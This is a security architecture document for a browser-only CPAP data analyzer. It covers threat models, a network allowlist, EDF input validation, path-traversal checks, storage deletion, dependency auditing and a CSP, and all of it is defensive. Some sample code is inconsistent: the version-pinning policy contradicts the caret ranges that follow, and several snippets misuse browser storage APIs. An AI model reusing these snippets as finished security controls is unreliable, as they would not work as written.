# Security Architecture

This document defines the complete security and privacy architecture for CPAP Analyzer, a client-side web application that processes sensitive medical data. It establishes trust boundaries, threat models, mitigation strategies, and security requirements for all system components.

**Target audience**: Security, Frontend, Database, DevOps, and all implementation agents.

**Last updated**: 2026-02-10

---

## 1. Executive Summary

### 1.1 Security Posture

CPAP Analyzer processes **Protected Health Information (PHI)** entirely within the browser. The application's security model is built on three foundational principles:

1. **Zero Trust Network**: No data transmission to external servers (except user-configured integrations with explicit consent).
2. **Client-Side Isolation**: All computation, storage, and analysis occurs locally.
3. **Defense in Depth**: Multiple layers of security controls to protect against input attacks, XSS, data exfiltration, and supply chain compromise.

### 1.2 Threat Model Overview

**Primary Threats**:

1. **Malicious EDF files** — Buffer overflows, code injection, resource exhaustion from untrusted SD card input
2. **XSS attacks** — Code injection via user-controlled content (notes, tags, filenames)
3. **Data exfiltration** — Unauthorized transmission of PHI to external servers
4. **Supply chain attacks** — Compromised npm dependencies introducing malicious code
5. **Browser storage attacks** — Other origins or extensions accessing IndexedDB/OPFS
6. **Side-channel leaks** — Timing attacks, cache attacks revealing sensitive data
7. **Plugin malicious behavior** — Third-party plugins accessing data beyond their declared scope

**Out of Scope**:

- Physical device compromise (if attacker has device access, game over)
- Browser engine vulnerabilities (we trust the browser's sandbox)
- Cross-site request forgery (no server-side state)
- SQL injection (no SQL database)

### 1.3 Trust Boundaries

```
┌─────────────────────────────────────────────────────────────┐
│  User's Browser (Trusted Execution Environment)             │
│  ┌───────────────────────────────────────────────────────┐  │
│  │  CPAP Analyzer Application (Same-Origin Sandbox)      │  │
│  │  ┌─────────────────────────────────────────────────┐  │  │
│  │  │  Application Code (TypeScript/JavaScript)       │  │  │
│  │  │  - Input validation                             │  │  │
│  │  │  - Data processing                              │  │  │
│  │  │  - UI rendering                                 │  │  │
│  │  └─────────────────────────────────────────────────┘  │  │
│  │  ┌─────────────────────────────────────────────────┐  │  │
│  │  │  Web Workers (Isolated Threads)                 │  │  │
│  │  │  - EDF parsing                                   │  │  │
│  │  │  - Signal processing                             │  │  │
│  │  │  - Analysis computations                         │  │  │
│  │  └─────────────────────────────────────────────────┘  │  │
│  │  ┌─────────────────────────────────────────────────┐  │  │
│  │  │  Third-Party Plugins (Sandboxed)                │  │  │
│  │  │  - Restricted API access via DataProvider       │  │  │
│  │  │  - No direct storage/network access              │  │  │
│  │  └─────────────────────────────────────────────────┘  │  │
│  └───────────────────────────────────────────────────────┘  │
│  ┌───────────────────────────────────────────────────────┐  │
│  │  Browser Storage (Origin-Isolated)                    │  │
│  │  - IndexedDB: cpap-analyzer                           │  │
│  │  - OPFS: /cpap-analyzer/                              │  │
│  │  - LocalStorage: theme, settings cache                │  │
│  └───────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
                         │
                         ▼
        ┌────────────────────────────────────┐
        │  External Boundaries (Untrusted)   │
        ├────────────────────────────────────┤
        │  • SD Card Files (EDF input)       │
        │  • User File Uploads (import)      │
        │  • npm Package Registry            │
        │  • CDNs (if any external JS)       │
        │  • User-Configured APIs:           │
        │    - Fitbit OAuth                  │
        │    - Weather APIs                  │
        │    - LLM endpoints                 │
        └────────────────────────────────────┘
```

---

## 2. Privacy Architecture

### 2.1 Client-Side Only Enforcement

**Principle**: No data leaves the user's device without explicit, informed consent.

#### 2.1.1 Network Request Policy

**Zero Network Requests** (default configuration):

- No analytics libraries (no Google Analytics, Mixpanel, etc.)
- No telemetry or crash reporting (no Sentry, Bugsnag, etc.)
- No CDN dependencies for runtime code (all JavaScript bundled)
- No social media widgets or tracking pixels
- No advertisement networks
- No auto-update checks that transmit device/user information

**Permitted Network Requests** (user-configured integrations only):

1. **Fitbit OAuth** — User must explicitly authenticate and authorize data access
2. **Weather APIs** — User must enable weather integration and provide API key
3. **LLM endpoints** — User must configure endpoint URL and authentication
4. **Pollen APIs** — User must enable pollen tracking feature

**Implementation**:

```typescript
// src/core/network-policy.ts
const ALLOWED_DOMAINS = new Set<string>();

export function registerAllowedDomain(domain: string, reason: string): void {
  if (!ALLOWED_DOMAINS.has(domain)) {
    console.info(`[Network Policy] Allowing ${domain}: ${reason}`);
    ALLOWED_DOMAINS.add(domain);
  }
}

export function validateNetworkRequest(url: string): void {
  const urlObj = new URL(url);
  const domain = urlObj.hostname;

  if (!ALLOWED_DOMAINS.has(domain)) {
    const error = `Blocked unauthorized network request to ${domain}`;
    console.error(error);
    throw new SecurityError(error, 'NETWORK_POLICY_VIOLATION');
  }
}

// Monkey-patch fetch to enforce policy
const originalFetch = window.fetch;
window.fetch = function (input: RequestInfo | URL, init?: RequestInit): Promise<Response> {
  const url = typeof input === 'string' ? input : input instanceof URL ? input.href : input.url;
  validateNetworkRequest(url);
  return originalFetch(input, init);
};
```

#### 2.1.2 No Telemetry Strategy

**Rationale**: Even anonymized telemetry can leak sensitive patterns:

- Session start times reveal sleep schedules
- Error rates may correlate with health events
- Feature usage patterns are behavioral biometrics

**Monitoring Alternative**: Client-side error logging to browser console only. Users can optionally export error logs for support requests.

```typescript
// src/core/error-handler.ts
interface ErrorReport {
  timestamp: string;
  message: string;
  stack?: string;
  context: Record<string, unknown>;
}

const errorLog: ErrorReport[] = [];

window.addEventListener('error', (event) => {
  const report: ErrorReport = {
    timestamp: new Date().toISOString(),
    message: event.message,
    stack: event.error?.stack,
    context: {
      filename: event.filename,
      lineno: event.lineno,
      colno: event.colno,
    },
  };

  errorLog.push(report);
  console.error('[Error]', report);

  // NEVER send this to a remote server
  // User can manually export for debugging
});

export function exportErrorLog(): Blob {
  const json = JSON.stringify(errorLog, null, 2);
  return new Blob([json], { type: 'application/json' });
}
```

#### 2.1.3 No Analytics

**Prohibited**:

- Usage tracking (page views, button clicks, feature adoption)
- Performance monitoring (render times, query durations)
- A/B testing frameworks
- Session replay tools

**Alternative**: User feedback forms that explicitly state data is local-only:

```typescript
// User completes feedback form locally
interface FeedbackForm {
  rating: number;
  category: 'bug' | 'feature-request' | 'documentation' | 'other';
  description: string;
  contactEmail?: string; // Optional, user choice
}

// Saved to IndexedDB, exported manually by user if they want to share
async function submitFeedback(feedback: FeedbackForm): Promise<void> {
  const db = await DatabaseConnection.open();
  await db
    .transaction('feedback', 'readwrite')
    .objectStore('feedback')
    .add({ ...feedback, timestamp: new Date().toISOString() });

  // Tell user how to share if they want to
  showNotification(
    'Feedback saved locally. To share with developers, use Settings → Export Feedback.',
  );
}
```

### 2.2 Local Storage Security

#### 2.2.1 Storage Isolation (Same-Origin Policy)

**Enforcement**: Browser's same-origin policy ensures that only `https://cpap-analyzer.example.com` (or localhost during development) can access the application's storage.

**Verification**:

- All storage operations (IndexedDB, OPFS, LocalStorage) are scoped to the origin
- No CORS configuration exposes storage to other domains
- No postMessage communication with other origins

#### 2.2.2 Encryption at Rest

**Current State**: Browser-level encryption (device encryption via FileVault, BitLocker, etc.) is the primary protection.

**Application-Level Encryption** (optional, for exports only):

**When to encrypt**:

- User exports data for backup → AES-256-GCM with PBKDF2-derived key
- User shares data with researcher → AES-256-GCM with shared password

**When NOT to encrypt** (in-browser storage):

- IndexedDB: No encryption (trust device encryption, avoid key management complexity)
- OPFS: No encryption (same rationale)
- LocalStorage: No encryption (contains no PHI, only theme/settings)

**Rationale**:

- Key management is the hardest problem in cryptography
- Storing encryption keys in browser storage defeats the purpose (attacker with storage access has keys)
- Requiring password entry on every app launch degrades UX unacceptably for a health tracking tool
- Device-level encryption (enabled by default on modern OSes) provides adequate protection

**Export Encryption** (see [storage-architecture.md](storage-architecture.md#93-exportbackup-format)):

```typescript
// AES-256-GCM with PBKDF2 key derivation
async function encryptExport(data: ExportData, password: string): Promise<Blob> {
  const key = await deriveKey(password, salt, 100000); // 100k iterations
  const ciphertext = await crypto.subtle.encrypt({ name: 'AES-GCM', iv }, key, plaintext);
  return packageEncrypted(salt, iv, ciphertext);
}
```

**Key Stretching**: PBKDF2 with 100,000 iterations (SHA-256) balances security and performance for export workflows.

#### 2.2.3 Data Retention and Deletion

**User Control**: Users have absolute control over data retention.

**Deletion Guarantees**:

1. **Soft Delete**: `deleted: true` flag hides data from UI; storage space not reclaimed
2. **Hard Delete**: Removes data from IndexedDB and OPFS permanently
3. **Bulk Delete**: Deletes all sessions in date range
4. **Complete Wipe**: Deletes entire database (Settings → Delete All Data)

```typescript
async function completeWipe(): Promise<void> {
  // 1. Delete IndexedDB
  await indexedDB.deleteDatabase('cpap-analyzer');

  // 2. Delete OPFS
  const root = await navigator.storage.getDirectory();
  for await (const entry of root.values()) {
    await root.removeEntry(entry.name, { recursive: true });
  }

  // 3. Clear LocalStorage
  localStorage.clear();

  // 4. Unregister Service Worker
  const registrations = await navigator.serviceWorker.getRegistrations();
  for (const registration of registrations) {
    await registration.unregister();
  }

  console.log('[Security] Complete data wipe executed');
}
```

**Verification**: After deletion, run storage enumeration to confirm no residual data:

```typescript
async function verifyDeletion(): Promise<boolean> {
  // Check IndexedDB
  const databases = await indexedDB.databases();
  const hasIndexedDB = databases.some((db) => db.name === 'cpap-analyzer');

  // Check OPFS
  const root = await navigator.storage.getDirectory();
  const entries = [];
  for await (const entry of root.values()) {
    entries.push(entry.name);
  }

  // Check LocalStorage
  const hasLocalStorage = Object.keys(localStorage).length > 0;

  return !hasIndexedDB && entries.length === 0 && !hasLocalStorage;
}
```

---

## 3. File Handling Security

### 3.1 EDF File Parsing Security

**Threat**: Malicious EDF files from compromised SD cards could exploit parsing bugs to achieve:

- Buffer overflows → Code execution
- Resource exhaustion → DoS
- Code injection → XSS
- Data exfiltration → Hidden network requests

#### 3.1.1 Input Validation Strategy

**Defense Layers**:

1. **File size limits** (pre-check before parsing)
2. **Header validation** (strict schema enforcement)
3. **Range validation** (physiological plausibility checks)
4. **Resource limits** (memory caps, timeout enforcement)
5. **Worker isolation** (parsing happens in sandboxed Web Worker)

#### 3.1.2 File Size Limits

```typescript
// src/parsers/edf-validator.ts
const MAX_EDF_FILE_SIZE = 500 * 1024 * 1024; // 500 MB (generous for 24h session)
const MAX_TOTAL_IMPORT_SIZE = 2 * 1024 * 1024 * 1024; // 2 GB per import batch

function validateFileSize(file: File): void {
  if (file.size > MAX_EDF_FILE_SIZE) {
    throw new ValidationError(
      `File ${file.name} exceeds maximum size (${MAX_EDF_FILE_SIZE / 1024 / 1024} MB)`,
      'FILE_TOO_LARGE',
    );
  }
}

function validateBatchSize(files: File[]): void {
  const totalSize = files.reduce((sum, file) => sum + file.size, 0);
  if (totalSize > MAX_TOTAL_IMPORT_SIZE) {
    throw new ValidationError(
      `Import batch exceeds maximum size (${MAX_TOTAL_IMPORT_SIZE / 1024 / 1024 / 1024} GB)`,
      'BATCH_TOO_LARGE',
    );
  }
}
```

**Rationale**:

- 500 MB per file: Accommodates 24-hour high-resolution recordings with margin
- 2 GB per batch: Allows importing weeks of data without memory issues

#### 3.1.3 Header Validation

**Strict Parsing**:

```typescript
interface EDFHeader {
  version: string; // Must be "0       " (8 bytes, space-padded)
  patientId: string; // 80 bytes, ASCII
  recordingId: string; // 80 bytes, ASCII
  startDate: string; // 8 bytes, "dd.mm.yy" format
  startTime: string; // 8 bytes, "hh.mm.ss" format
  headerBytes: number; // Must equal 256 + (256 * numSignals)
  reserved: string; // 44 bytes, should contain "EDF+C" or "EDF+D"
  numRecords: number; // -1 or positive integer
  recordDuration: number; // Positive integer (seconds)
  numSignals: number; // Positive integer (typically 1-64)
}

function validateEDFHeader(buffer: ArrayBuffer): EDFHeader {
  const view = new DataView(buffer);

  // Version check
  const version = readString(buffer, 0, 8);
  if (version !== '0       ') {
    throw new ValidationError('Invalid EDF version', 'INVALID_HEADER');
  }

  // Header byte count validation
  const headerBytes = parseInt(readString(buffer, 184, 8).trim(), 10);
  const numSignals = parseInt(readString(buffer, 252, 4).trim(), 10);
  const expectedHeaderBytes = 256 + 256 * numSignals;

  if (headerBytes !== expectedHeaderBytes) {
    throw new ValidationError(
      `Header byte count mismatch: expected ${expectedHeaderBytes}, got ${headerBytes}`,
      'INVALID_HEADER',
    );
  }

  // Signal count sanity check
  if (numSignals < 1 || numSignals > 256) {
    throw new ValidationError(
      `Invalid signal count: ${numSignals} (must be 1-256)`,
      'INVALID_HEADER',
    );
  }

  // Record duration sanity check
  const recordDuration = parseInt(readString(buffer, 244, 8).trim(), 10);
  if (recordDuration < 1 || recordDuration > 3600) {
    throw new ValidationError(
      `Invalid record duration: ${recordDuration}s (must be 1-3600)`,
      'INVALID_HEADER',
    );
  }

  // ... continue validation for all fields

  return parsedHeader;
}
```

**Date/Time Validation**:

```typescript
function parseEDFDate(dateStr: string): Date {
  // Format: "dd.mm.yy"
  const match = dateStr.match(/^(\d{2})\.(\d{2})\.(\d{2})$/);
  if (!match) {
    throw new ValidationError(`Invalid date format: ${dateStr}`, 'INVALID_DATE');
  }

  const day = parseInt(match[1], 10);
  const month = parseInt(match[2], 10);
  let year = parseInt(match[3], 10);

  // Y2K pivot: 00-84 → 2000-2084, 85-99 → 1985-1999
  year += year < 85 ? 2000 : 1900;

  // Validate ranges
  if (month < 1 || month > 12) {
    throw new ValidationError(`Invalid month: ${month}`, 'INVALID_DATE');
  }
  if (day < 1 || day > 31) {
    throw new ValidationError(`Invalid day: ${day}`, 'INVALID_DATE');
  }

  const date = new Date(year, month - 1, day);

  // Check for impossible dates (e.g., Feb 30)
  if (date.getFullYear() !== year || date.getMonth() !== month - 1 || date.getDate() !== day) {
    throw new ValidationError(`Invalid date: ${dateStr}`, 'INVALID_DATE');
  }

  return date;
}
```

#### 3.1.4 Signal Data Validation

**Physiological Range Validation**:

```typescript
interface PhysiologicalRange {
  min: number;
  max: number;
  unit: string;
}

const PHYSIOLOGICAL_RANGES: Record<string, PhysiologicalRange> = {
  flow: { min: -200, max: 200, unit: 'L/min' },
  maskPressure: { min: 0, max: 30, unit: 'cmH2O' },
  leak: { min: 0, max: 150, unit: 'L/min' },
  spo2: { min: 0, max: 100, unit: '%' },
  pulse: { min: 20, max: 250, unit: 'bpm' },
  tidalVolume: { min: 0, max: 3000, unit: 'mL' },
  respRate: { min: 0, max: 60, unit: 'breaths/min' },
};

function validateSignalData(channelName: string, data: Float32Array): ValidationWarnings {
  const warnings: string[] = [];
  const range = PHYSIOLOGICAL_RANGES[channelName];

  if (!range) {
    warnings.push(`Unknown channel: ${channelName}, skipping validation`);
    return { valid: true, warnings };
  }

  let outOfRangeCount = 0;
  let nanCount = 0;
  let infCount = 0;

  for (let i = 0; i < data.length; i++) {
    const value = data[i];

    if (isNaN(value)) {
      nanCount++;
    } else if (!isFinite(value)) {
      infCount++;
    } else if (value < range.min || value > range.max) {
      outOfRangeCount++;
    }
  }

  const totalCount = data.length;
  const outOfRangePercent = (outOfRangeCount / totalCount) * 100;
  const nanPercent = (nanCount / totalCount) * 100;
  const infPercent = (infCount / totalCount) * 100;

  // Fail if >10% of values are NaN/Inf (data corruption)
  if (nanPercent > 10 || infPercent > 10) {
    throw new ValidationError(
      `Signal ${channelName} has ${nanPercent.toFixed(1)}% NaN, ${infPercent.toFixed(1)}% Inf (corrupt data)`,
      'CORRUPT_SIGNAL_DATA',
    );
  }

  // Warn if >5% of values are out of physiological range
  if (outOfRangePercent > 5) {
    warnings.push(
      `Signal ${channelName}: ${outOfRangePercent.toFixed(1)}% of values outside ` +
        `physiological range [${range.min}, ${range.max}] ${range.unit}`,
    );
  }

  return { valid: true, warnings };
}
```

#### 3.1.5 Resource Limits

**Timeout Enforcement** (Web Worker):

```typescript
// src/workers/edf-parser.worker.ts
const PARSE_TIMEOUT_MS = 120_000; // 2 minutes max per file

async function parseWithTimeout(file: File): Promise<EDFData> {
  return Promise.race([
    parseEDFFile(file),
    new Promise<never>((_, reject) =>
      setTimeout(() => reject(new Error('Parse timeout exceeded')), PARSE_TIMEOUT_MS),
    ),
  ]);
}
```

**Memory Limits**:

```typescript
const MAX_SIGNAL_SAMPLES = 100_000_000; // 100M samples = ~400 MB Float32Array

function enforceMemoryLimits(header: EDFHeader): void {
  const samplesPerRecord = header.signals.reduce((sum, sig) => sum + sig.samplesPerRecord, 0);
  const totalSamples = samplesPerRecord * header.numRecords;

  if (totalSamples > MAX_SIGNAL_SAMPLES) {
    throw new ValidationError(
      `File exceeds maximum sample count: ${totalSamples} > ${MAX_SIGNAL_SAMPLES}`,
      'TOO_MANY_SAMPLES',
    );
  }
}
```

#### 3.1.6 Worker Isolation

**Parsing in Web Worker**:

```typescript
// Main thread (UI)
import { wrap } from 'comlink';

const EDFParserWorker = wrap<typeof import('./edf-parser.worker')>(
  new Worker(new URL('./edf-parser.worker.ts', import.meta.url), {
    type: 'module',
  }),
);

async function importEDFFile(file: File): Promise<void> {
  try {
    // File is transferred to worker (structured clone)
    const result = await EDFParserWorker.parseEDFFile(file);

    // Store parsed data
    await storeSession(result);
  } catch (error) {
    // Worker exception is caught here, UI remains responsive
    console.error('Parse error:', error);
    showErrorNotification('Failed to parse EDF file');
  }
}
```

**Benefits of Worker Isolation**:

1. **DoS Protection**: Infinite loops or excessive computation in parser don't freeze UI
2. **Memory Isolation**: Worker memory is separate; OOM in worker doesn't crash main thread
3. **Exception Containment**: Parser bugs don't affect application state

#### 3.1.7 String Encoding Safety

**Prevent Buffer Overflows**:

```typescript
function readString(buffer: ArrayBuffer, offset: number, length: number): string {
  // Validate bounds before access
  if (offset < 0 || length < 0 || offset + length > buffer.byteLength) {
    throw new RangeError(
      `String read out of bounds: offset=${offset}, length=${length}, bufferSize=${buffer.byteLength}`,
    );
  }

  const bytes = new Uint8Array(buffer, offset, length);

  // Decode as ASCII (EDF spec mandates ASCII)
  // Use TextDecoder to avoid manual string construction
  const decoder = new TextDecoder('ascii');
  return decoder.decode(bytes);
}
```

**Annotation Parsing** (prevent injection):

```typescript
function parseAnnotation(annotationBytes: Uint8Array): Annotation {
  const decoder = new TextDecoder('ascii');
  const text = decoder.decode(annotationBytes);

  // Split on EDF+ delimiters
  const parts = text.split('\x15'); // Field separator

  // Validate onset format (prevent code injection)
  const onsetStr = parts[0]?.replace(/^\+/, '');
  if (!/^[0-9.]+$/.test(onsetStr)) {
    throw new ValidationError(`Invalid annotation onset: ${onsetStr}`, 'INVALID_ANNOTATION');
  }

  const onset = parseFloat(onsetStr);
  if (!isFinite(onset) || onset < 0) {
    throw new ValidationError(`Invalid annotation onset value: ${onset}`, 'INVALID_ANNOTATION');
  }

  // Sanitize annotation text (prevent XSS)
  const annotationText = parts[2]?.replace(/[\x00-\x1F\x7F]/g, ''); // Remove control chars

  return {
    onset,
    duration: parseFloat(parts[1] || '0'),
    text: sanitizeHTML(annotationText), // HTML encode for display
  };
}
```

### 3.2 File Upload Security

**User File Uploads** (import from backup):

- Same validation rules as EDF files
- Validate JSON structure for export format
- Rate limit imports to prevent resource exhaustion

```typescript
const importRateLimiter = {
  lastImportTime: 0,
  MIN_IMPORT_INTERVAL_MS: 5000, // 5 seconds between imports
};

async function importFromBackup(file: File): Promise<void> {
  // Rate limiting
  const now = Date.now();
  if (now - importRateLimiter.lastImportTime < importRateLimiter.MIN_IMPORT_INTERVAL_MS) {
    throw new Error('Import rate limit exceeded, please wait before importing again');
  }
  importRateLimiter.lastImportTime = now;

  // File size check
  validateFileSize(file);

  // Parse and validate
  const data = await parseImportFile(file);

  // Schema validation
  validateImportSchema(data);

  // Import to storage
  await importToIndexedDB(data);
}
```

### 3.3 Malformed File Handling

**Graceful Degradation**:

```typescript
async function importSession(file: File): Promise<ImportResult> {
  const errors: string[] = [];
  const warnings: string[] = [];
  let success = false;

  try {
    // Attempt parse
    const data = await parseEDFFile(file);

    // Validate each channel
    for (const channel of data.channels) {
      try {
        const validation = validateSignalData(channel.name, channel.data);
        warnings.push(...validation.warnings);
      } catch (error) {
        // Skip corrupt channel but continue with others
        errors.push(`Channel ${channel.name}: ${error.message}`);
        continue;
      }
    }

    // Store partial data if at least one valid channel
    if (data.channels.length > 0) {
      await storeSession(data);
      success = true;
    }
  } catch (error) {
    errors.push(`Fatal parse error: ${error.message}`);
  }

  return { success, errors, warnings };
}
```

---

## 4. Data Storage Security

### 4.1 IndexedDB Security

#### 4.1.1 Same-Origin Isolation

**Enforcement**: IndexedDB is automatically scoped to origin by browser.

**Verification**:

```typescript
async function verifyStorageIsolation(): Promise<boolean> {
  // Check that only our origin can access the database
  const dbName = 'cpap-analyzer';
  const db = await indexedDB.open(dbName, 1);

  // Attempt to access from different origin would fail with SecurityError
  // (can't test programmatically, but browser enforces)

  return true;
}
```

#### 4.1.2 Transaction Integrity

**Atomic Imports**:

```typescript
async function importSessionAtomic(sessionData: SessionData): Promise<void> {
  const db = await DatabaseConnection.open();

  // All-or-nothing transaction
  const tx = db.transaction(['sessions', 'nightly_aggregates', 'events'], 'readwrite');

  try {
    // Add session
    await tx.objectStore('sessions').add(sessionData.session);

    // Add aggregates
    for (const aggregate of sessionData.aggregates) {
      await tx.objectStore('nightly_aggregates').add(aggregate);
    }

    // Add events
    for (const event of sessionData.events) {
      await tx.objectStore('events').add(event);
    }

    // Commit transaction
    await tx.complete;

    console.log(`[Storage] Session ${sessionData.session.id} imported successfully`);
  } catch (error) {
    // Transaction automatically rolled back on error
    console.error('[Storage] Import failed, transaction rolled back:', error);
    throw error;
  }
}
```

#### 4.1.3 Query Injection Prevention

**Parameterized Queries Only** (IndexedDB uses object keys, not SQL):

```typescript
// SAFE: Using index lookups
async function getSessionsByDateRange(start: string, end: string): Promise<Session[]> {
  const db = await DatabaseConnection.open();
  const index = db.transaction('sessions').objectStore('sessions').index('date');

  // IDBKeyRange is safe (no injection possible)
  const range = IDBKeyRange.bound(start, end);
  const sessions = await index.getAll(range);

  return sessions;
}

// SAFE: Using get by key
async function getSessionById(id: string): Promise<Session | undefined> {
  const db = await DatabaseConnection.open();
  const session = await db.transaction('sessions').objectStore('sessions').get(id);

  return session;
}
```

**User Input Sanitization** (for search/filter):

```typescript
function sanitizeSearchQuery(query: string): string {
  // Remove control characters
  return query.replace(/[\x00-\x1F\x7F]/g, '');
}

async function searchSessions(query: string): Promise<Session[]> {
  const sanitized = sanitizeSearchQuery(query);
  const db = await DatabaseConnection.open();
  const allSessions = await db.transaction('sessions').objectStore('sessions').getAll();

  // Filter in application code (no injection risk)
  return allSessions.filter(
    (session) =>
      session.notes?.toLowerCase().includes(sanitized.toLowerCase()) ||
      session.tags?.some((tag) => tag.toLowerCase().includes(sanitized.toLowerCase())),
  );
}
```

### 4.2 OPFS Security

#### 4.2.1 Origin Isolation

**Enforcement**: OPFS (Origin Private File System) is browser-enforced private storage.

**Access Control**:

- Only scripts from the same origin can access OPFS
- No way for other origins to list or read OPFS files
- Even with file handle, other origins cannot access

#### 4.2.2 Path Traversal Prevention

```typescript
function validateOPFSPath(path: string): void {
  // Prevent directory traversal
  if (path.includes('..') || path.includes('//') || path.startsWith('/')) {
    throw new SecurityError(
      `Invalid OPFS path: ${path} (path traversal detected)`,
      'PATH_TRAVERSAL',
    );
  }

  // Enforce path format
  if (!/^signals\/[a-f0-9-]{36}\/[\w.-]+$/.test(path)) {
    throw new SecurityError(`Invalid OPFS path format: ${path}`, 'INVALID_PATH');
  }
}

async function readSignalChunk(sessionId: string, chunkId: string): Promise<Float32Array> {
  const path = `signals/${sessionId}/${chunkId}`;
  validateOPFSPath(path);

  const root = await navigator.storage.getDirectory();
  const fileHandle = await root.getFileHandle(path);
  const file = await fileHandle.getFile();
  const buffer = await file.arrayBuffer();

  return new Float32Array(buffer);
}
```

#### 4.2.3 Quota Management

**Prevent Storage Exhaustion**:

```typescript
async function checkQuotaBeforeWrite(dataSize: number): Promise<void> {
  const estimate = await navigator.storage.estimate();
  const usage = estimate.usage ?? 0;
  const quota = estimate.quota ?? 0;
  const available = quota - usage;

  if (dataSize > available) {
    throw new QuotaExceededError(
      `Insufficient storage: need ${(dataSize / 1024 / 1024).toFixed(1)} MB, ` +
        `have ${(available / 1024 / 1024).toFixed(1)} MB available`,
    );
  }

  // Warn if above 80% usage
  const percentUsed = (usage / quota) * 100;
  if (percentUsed > 80) {
    console.warn(`Storage ${percentUsed.toFixed(1)}% full`);
    notifyUser('storage-warning', 'Storage is running low. Consider deleting old sessions.');
  }
}
```

### 4.3 Encryption at Rest (Exports Only)

**See Section 2.2.2** for detailed encryption strategy.

**Key Points**:

- No encryption for in-browser storage (device encryption is sufficient)
- AES-256-GCM for user exports
- PBKDF2 with 100,000 iterations for key derivation
- Never store encryption keys in browser storage

### 4.4 Data Sanitization on Delete

**Secure Deletion**:

```typescript
async function secureDeleteSession(sessionId: string): Promise<void> {
  // 1. Delete IndexedDB records
  await hardDeleteFromIndexedDB(sessionId);

  // 2. Overwrite OPFS files before deletion (optional, may not be effective)
  await overwriteSignalFiles(sessionId);

  // 3. Delete OPFS files
  await deleteSignalFiles(sessionId);

  // 4. Request garbage collection hint (not guaranteed)
  if ('gc' in window) {
    (window as any).gc();
  }
}

async function overwriteSignalFiles(sessionId: string): Promise<void> {
  // Best-effort overwrite (browser may optimize away)
  const root = await navigator.storage.getDirectory();
  const sessionDir = await root.getDirectoryHandle(`signals/${sessionId}`);

  for await (const entry of sessionDir.values()) {
    if (entry.kind === 'file') {
      const handle = await sessionDir.getFileHandle(entry.name, { create: false });
      const file = await handle.getFile();
      const size = file.size;

      // Overwrite with zeros
      const writable = await handle.createWritable();
      await writable.write(new Uint8Array(size));
      await writable.close();
    }
  }
}
```

**Note**: Secure deletion in browsers is best-effort. SSDs and browser optimizations may retain data in memory/cache. Rely on device encryption for true deletion.

---

## 5. Third-Party Dependencies

### 5.1 Supply Chain Security

#### 5.1.1 Dependency Audit Strategy

**Automated Auditing**:

```bash
# Run on every CI build
npm audit --audit-level=high

# Fail build if high/critical vulnerabilities
npm audit --audit-level=high --production
```

**Audit Levels**:

- **Critical/High**: Block merge, require immediate fix or mitigation
- **Moderate**: Review and schedule fix within 30 days
- **Low**: Review and fix opportunistically

**Automated Dependency Updates**:

- Dependabot enabled for security patches
- Auto-merge patch versions for security fixes
- Manual review required for minor/major updates

#### 5.1.2 Version Pinning Policy

**package.json**:

```json
{
  "dependencies": {
    "react": "18.2.0", // Exact version, no ^ or ~
    "react-dom": "18.2.0",
    "zustand": "4.5.0",
    "@radix-ui/react-dialog": "1.0.5"
  },
  "devDependencies": {
    "typescript": "5.3.3",
    "vite": "5.0.12",
    "vitest": "1.2.0"
  }
}
```

**Rationale**:

- Exact versions ensure reproducible builds
- Prevent unexpected breaking changes or supply chain injection
- package-lock.json provides full transitive dependency tree

**Update Process**:

1. Review changelog for security fixes
2. Test in CI pipeline
3. Review diff of updated dependencies
4. Merge after QA approval

#### 5.1.3 Dependency Minimization

**Minimal Dependency Set**:

```json
{
  "dependencies": {
    "react": "^18.2.0",
    "react-dom": "^18.2.0",
    "react-router-dom": "^6.21.0",
    "zustand": "^4.5.0",
    "@radix-ui/react-dialog": "^1.0.5",
    "@radix-ui/react-dropdown-menu": "^2.0.6",
    "@radix-ui/react-tooltip": "^1.0.7",
    "@radix-ui/react-select": "^2.0.0",
    "comlink": "^4.4.1",
    "date-fns": "^3.0.0"
  }
}
```

**Avoided Dependencies**:

- **Lodash**: ESLint rule `no-restricted-imports` → Use native methods
- **Moment.js**: Deprecated, large bundle → Use date-fns
- **jQuery**: Unnecessary with React → Use native DOM APIs
- **Axios**: Unnecessary → Use native fetch
- **Class-validator decorators**: Runtime overhead → Use Zod for validation

**Bundle Size Monitoring**:

```bash
# Report bundle size on every build
vite build --mode production

# Fail if bundle exceeds threshold
npm run build:check-size
```

#### 5.1.4 Subresource Integrity (SRI)

**No CDN Dependencies** (all JavaScript bundled):

- No external script tags in HTML
- All dependencies bundled via Vite
- No runtime loading of third-party code

**If CDN Required** (e.g., for fonts):

```html
<link
  rel="stylesheet"
  href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap"
  integrity="sha384-..."
  crossorigin="anonymous"
/>
```

### 5.2 Dependency Review Process

**Pre-Merge Checklist**:

1. ✅ `npm audit` passes at `high` severity level
2. ✅ Dependency has >10k weekly downloads (popularity metric)
3. ✅ Dependency has active maintenance (commit in last 6 months)
4. ✅ Dependency has TypeScript types (in package or @types)
5. ✅ Dependency license is OSI-approved (MIT, Apache, BSD)
6. ✅ Review dependency's dependencies (transitive audit)
7. ✅ Bundle size impact assessed (< 50 KB gzipped per dependency)

**Example Review Notes**:

```markdown
## Dependency Review: @radix-ui/react-dialog

- **Purpose**: Accessible modal/dialog primitive
- **Version**: 1.0.5
- **License**: MIT ✅
- **Weekly Downloads**: 500k+ ✅
- **Bundle Size**: 12 KB gzipped ✅
- **TypeScript**: Native TS ✅
- **Maintenance**: Active (commit 2 weeks ago) ✅
- **Transitive Deps**: 3 (all @radix-ui packages) ✅
- **Security Audit**: No known vulnerabilities ✅

**Decision**: APPROVED
```

---

## 6. Content Security Policy (CSP)

### 6.1 Recommended CSP Headers

**Production CSP**:

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'wasm-unsafe-eval';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: blob:;
  font-src 'self' data:;
  connect-src 'self' https://api.fitbit.com https://api.openweathermap.org;
  worker-src 'self' blob:;
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  block-all-mixed-content;
  upgrade-insecure-requests;
```

**Directive Explanations**:

| Directive                   | Value                                                          | Rationale                                                                    |
| --------------------------- | -------------------------------------------------------------- | ---------------------------------------------------------------------------- |
| `default-src`               | `'self'`                                                       | Only load resources from same origin                                         |
| `script-src`                | `'self' 'wasm-unsafe-eval'`                                    | Allow bundled scripts and WebAssembly (if used for SIMD)                     |
| `style-src`                 | `'self' 'unsafe-inline'`                                       | Allow CSS Modules (inline styles in React components)                        |
